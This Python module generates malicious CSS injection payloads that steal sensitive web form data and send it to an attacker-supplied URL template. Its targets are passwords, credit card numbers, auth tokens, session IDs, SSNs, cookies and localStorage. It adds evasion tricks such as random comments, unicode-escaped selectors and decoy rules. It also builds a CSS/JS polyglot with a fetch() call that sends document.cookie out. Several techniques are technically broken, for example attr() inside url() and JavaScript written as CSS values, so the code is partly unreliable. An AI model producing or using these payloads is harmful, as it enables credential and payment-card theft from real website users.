import random
import string
from utils.helpers import encode_for_url, chunk_data

def generate_advanced_exfil_css(exfil_url_template, evasion_level=1):
    """
    Generate advanced malicious CSS for data exfiltration with evasion techniques

    Args:
        exfil_url_template: URL template with {data} placeholder for exfiltrated data
        evasion_level: Level of evasion techniques (1=basic, 2=advanced)

    Returns:
        str: Advanced malicious CSS payload with evasion techniques
    """
    # Base selectors for sensitive data
    selectors = {
        'password': 'input[type="password"]',
        'credit_card': 'input[name*="credit"], input[name*="card"], input[id*="credit"], input[id*="card"]',
        'email': 'input[type="email"], input[name*="email"], input[id*="email"]',
        'username': 'input[name*="user"], input[id*="user"], input[name*="login"], input[id*="login"]',
        'address': 'input[name*="address"], input[id*="address"]',
        'phone': 'input[name*="phone"], input[id*="phone"], input[name*="tel"], input[id*="tel"]',
        'hidden': 'input[type="hidden"]',
        'account_info': '.account-info, .user-info, .profile-data',
    }

    # Advanced selectors that can extract more specific data
    advanced_selectors = {
        'auth_token': 'input[name*="token"], input[name*="csrf"], input[name*="xsrf"]',
        'session_id': 'input[name*="session"], input[name*="sid"]',
        'api_key': 'input[name*="api"], input[name*="key"]',
        'social_security': 'input[name*="ssn"], input[name*="social"]',
        'date_of_birth': 'input[name*="dob"], input[name*="birth"]',
        'secret_question': 'input[name*="secret"], input[name*="question"]',
    }

    # Combine selectors based on evasion level
    if evasion_level >= 2:
        selectors.update(advanced_selectors)

    css_payload = ""

    # Add CSS comment with random data to evade signature detection
    if evasion_level >= 1:
        random_comment = ''.join(random.choice(string.ascii_letters) for _ in range(20))
        css_payload += f"/* {random_comment} */\n"

    # For each type of sensitive data, create a CSS rule that exfiltrates it
    for data_type, selector in selectors.items():
        # Apply different techniques based on evasion level
        if evasion_level == 1:
            # Basic evasion: Split selectors and use random attribute names
            parts = selector.split(', ')
            for i, part in enumerate(parts):
                # Add some randomness to the selector to evade detection
                random_attr = ''.join(random.choice(string.ascii_lowercase) for _ in range(5))

                css_payload += f"""
/* Exfil {data_type} part {i+1} */
{part}[{random_attr}^=""], {part} {{
    background-image: url({exfil_url_template.format(data=f"{data_type}{i}:" + "attr(value)")});
}}
"""
        elif evasion_level >= 2:
            # Advanced evasion: Use CSS unicode escapes, font-face tricks, and more
            # Convert selector to use unicode escapes
            escaped_selector = ''.join(f"\\{ord(c):x} " if c.isalpha() else c for c in selector)

            # Use multiple techniques for the same data
            css_payload += f"""
/* Advanced exfil for {data_type} */
{escaped_selector} {{
    --data: attr(value);
    background-image: url({exfil_url_template.format(data=f"{data_type}1:" + "var(--data)")});
}}

@font-face {{
    font-family: exfil_{data_type};
    src: url({exfil_url_template.format(data=f"{data_type}2:" + "attr(value)")});
    unicode-range: U+0-10FFFF;
}}

{selector} {{
    font-family: exfil_{data_type}, sans-serif;
}}

/* Keyframe animation exfiltration */
@keyframes exfil_{data_type} {{
    from {{ background-image: none; }}
    to {{ background-image: url({exfil_url_template.format(data=f"{data_type}3:" + "attr(value)")}); }}
}}

{selector} {{
    animation: exfil_{data_type} 1ms;
}}
"""
        else:
            # No evasion, use basic technique
            if 'input' in selector:
                css_payload += f"""
{selector} {{
    background-image: url({exfil_url_template.format(data=f"{data_type}:" + "attr(value)")});
}}
"""
            else:
                css_payload += f"""
{selector}::before {{
    content: "{data_type}:";
    background-image: url({exfil_url_template.format(data=f"{data_type}:" + "attr(textContent)")});
    display: none;
}}
"""

    # Add advanced character-by-character exfiltration for passwords
    if evasion_level >= 2:
        css_payload += """
/* Character-by-character password exfiltration */
"""
        # For each possible first character in a password
        for char in string.ascii_letters + string.digits + string.punctuation:
            safe_char = encode_for_url(char)
            css_payload += f"""
input[type="password"][value^="{char}"] {{
    --first-char: "{safe_char}";
    background-image: url({exfil_url_template.format(data=f"pwd_char:{safe_char}")});
}}
"""

    # Add cookie exfiltration attempts if evasion level is high
    if evasion_level >= 2:
        css_payload += """
/* Attempt to exfiltrate cookies via CSS injection in a vulnerable page */
:root {
    --cookies: document.cookie;
    background-image: url(%s);
}
""" % exfil_url_template.format(data="cookies:var(--cookies)")

        # Add localStorage exfiltration attempt
        css_payload += """
/* Attempt to exfiltrate localStorage via CSS */
:root {
    --storage: localStorage.getItem('auth');
    background-image: url(%s);
}
""" % exfil_url_template.format(data="storage:var(--storage)")

    # Add CSS attribute selectors for regex-like matching
    if evasion_level >= 2:
        # Credit card number pattern matching (first 4 digits)
        for i in range(1000, 10000):
            if i % 1000 == 0:  # Only include some ranges to keep the payload size reasonable
                css_payload += f"""
input[value^="{i}"] {{
    background-image: url({exfil_url_template.format(data=f"cc_prefix:{i}")});
}}
"""

    # Add timing-based exfiltration techniques
    if evasion_level >= 2:
        css_payload += """
/* Timing-based exfiltration */
@keyframes timing_exfil {
    0% { background-image: url(%s); }
    100% { background-image: url(%s); }
}

input[type="password"] {
    animation-name: timing_exfil;
    animation-duration: attr(value length) ms;
    animation-timing-function: steps(1);
}
""" % (
    exfil_url_template.format(data="timing_start:0"),
    exfil_url_template.format(data="timing_end:1")
)

    # Add media query based exfiltration for responsive design information
    css_payload += """
/* Media query based exfiltration */
@media (min-width: 1200px) {
    body::after {
        content: "";
        background-image: url(%s);
        display: none;
    }
}

@media (max-width: 768px) {
    body::after {
        content: "";
        background-image: url(%s);
        display: none;
    }
}
""" % (
    exfil_url_template.format(data="screen:desktop"),
    exfil_url_template.format(data="screen:mobile")
)

    # Add CSS variable exfiltration
    css_payload += """
/* CSS variable exfiltration */
:root {
    --exfil-data: "potential-data";
}

.container, #main, .content {
    background-image: url(%s);
}
""" % exfil_url_template.format(data="cssvar:var(--exfil-data)")

    # Add obfuscation if evasion level is maximum
    if evasion_level >= 2:
        # Obfuscate the payload by adding random valid CSS that does nothing
        random_classes = [f".rand_{random.randint(1000, 9999)}" for _ in range(5)]
        random_ids = [f"#rand_{random.randint(1000, 9999)}" for _ in range(5)]

        for selector in random_classes + random_ids:
            css_payload += f"""
{selector} {{
    margin: 0;
    padding: 0;
    display: inline;
}}
"""

        # Add decoy rules that look like exfiltration but don't do anything
        decoy_urls = [
            "https://example.com/image.jpg",
            "https://cdn.example.org/style.css",
            "/assets/images/logo.png",
            "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"
        ]

        for i, url in enumerate(decoy_urls):
            decoy_selector = f".decoy_{i}, #decoy_{i}"
            css_payload += f"""
{decoy_selector} {{
    background-image: url("{url}");
}}
"""

    return css_payload

def generate_targeted_exfil_css(exfil_url_template, target_elements):
    """
    Generate CSS specifically targeting known elements on a page

    Args:
        exfil_url_template: URL template with {data} placeholder for exfiltrated data
        target_elements: List of dictionaries with element info (id, class, type, name)

    Returns:
        str: Targeted CSS payload
    """
    css_payload = "/* Targeted exfiltration CSS */\n"

    for i, element in enumerate(target_elements):
        selector_parts = []

        if 'id' in element and element['id']:
            selector_parts.append(f"#{element['id']}")

        if 'class' in element and element['class']:
            for cls in element['class'].split():
                selector_parts.append(f".{cls}")

        if 'type' in element and element['type']:
            selector_parts.append(f"[type=\"{element['type']}\"]")

        if 'name' in element and element['name']:
            selector_parts.append(f"[name=\"{element['name']}\"]")

        # Combine parts with appropriate logic
        if len(selector_parts) > 1:
            # If we have id, it's specific enough
            if selector_parts[0].startswith('#'):
                selector = selector_parts[0]
            else:
                # Combine all parts for a specific selector
                selector = ''.join(selector_parts)
        elif len(selector_parts) == 1:
            selector = selector_parts[0]
        else:
            # Skip if we don't have enough info
            continue

        element_type = element.get('type', '')
        element_name = element.get('name', '')

        # Create a descriptive data prefix
        if element_type == 'password':
            data_prefix = 'pwd'
        elif 'user' in element_name or 'login' in element_name:
            data_prefix = 'user'
        elif 'email' in element_name:
            data_prefix = 'email'
        elif 'card' in element_name or 'credit' in element_name:
            data_prefix = 'cc'
        else:
            data_prefix = f"field{i}"

        css_payload += f"""
/* Target element: {selector} */
{selector} {{
    background-image: url({exfil_url_template.format(data=f"{data_prefix}:" + "attr(value)")});
}}
"""

    return css_payload

def generate_polyglot_css_js_payload(exfil_url_template):
    """
    Generate a polyglot payload that works as both CSS and JavaScript
    Useful for injection points that might be interpreted as either CSS or JS

    Args:
        exfil_url_template: URL template with {data} placeholder for exfiltrated data

    Returns:
        str: Polyglot CSS/JS payload
    """
    # This is a CSS comment but also valid JS with no effect
    payload = "/*\n"
    payload += "*/\n"

    # This works as both CSS and JS (JS will see it as a label and string)
    payload += "input: 'input';\n"

    # This is valid CSS and also valid JS (JS will see it as a label and a block)
    payload += "form {\n"
    payload += "  background-image: url(" + exfil_url_template.format(data="polyglot:test") + ");\n"
    payload += "}\n"

    # JS exfiltration that looks like CSS
    payload += "/*\n"
    payload += "fetch('" + exfil_url_template.format(data="js:'+document.cookie+'") + "');\n"
    payload += "*/\n"

    return payload
